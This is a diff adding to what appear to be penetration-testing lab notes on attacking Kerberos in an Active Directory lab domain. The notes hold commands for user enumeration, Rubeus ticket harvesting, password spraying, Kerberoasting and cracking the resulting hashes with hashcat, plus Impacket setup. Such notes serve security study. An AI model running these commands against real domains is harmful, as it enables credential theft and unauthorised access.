@@ -48,15 +48,55 @@
 ````
 - This will brute force user accounts from a domain controller using a supplied wordlist
 - ![1](https://user-images.githubusercontent.com/75596877/130246484-1b4fdb60-eb89-441b-b0c7-c1b06277c074.png)
-
-
-
-
-
-
-
-
-
+#### Enumerate Users Metasploit
+````
+auxiliary/gather/kerberos_enumusers
+````
+### rdesktop Into a Domain
+````
+rdesktop -u Administrator -p P@$$W0rd -d controller.local  10.10.121.111 
+````
+## Rubeus
+- This command tells Rubeus to harvest for TGTs every 30 seconds
+````
+Rubeus.exe harvest /interval:30
+````
+- ![alt text](https://i.imgur.com/VCeyyn9.png)
+### Brute-Forcing and Password-Spraying with Rubeus 
+- Rubeus can both brute force passwords as well as password spray user accounts
+- This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket.
+- Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. 
+- You can add the IP and domain name to the hosts file from the machine by using the echo command: 
+````
+echo 10.10.121.111 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+````
+- This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
+````
+Rubeus.exe brute /password:Password1 /noticket 
+````
+- ![alt text](https://i.imgur.com/WN4zVo5.png)
+- Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
+## Kerberoasting with Rubeus and Impacket
+- Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. 
+- If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. 
+- To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts.
+- It will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.
+### Kerberoasting with Rubeus
+- This will dump the Kerberos hash of any kerberoastable users  
+````
+Rubeus.exe kerberoast
+````
+- Copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
+````
+hashcat -m 13100 -a 0 hash.txt Pass.txt
+````
+### Kerberoasting with Impacket
+#### Impacket Installation  
+- Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
+- `cd /opt` navigate to your preferred directory to save tools in 
+- Download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
+- `cd Impacket-0.9.19` navigate to the impacket directory
+- `pip install .` - this will install all needed dependencies
 
 
 
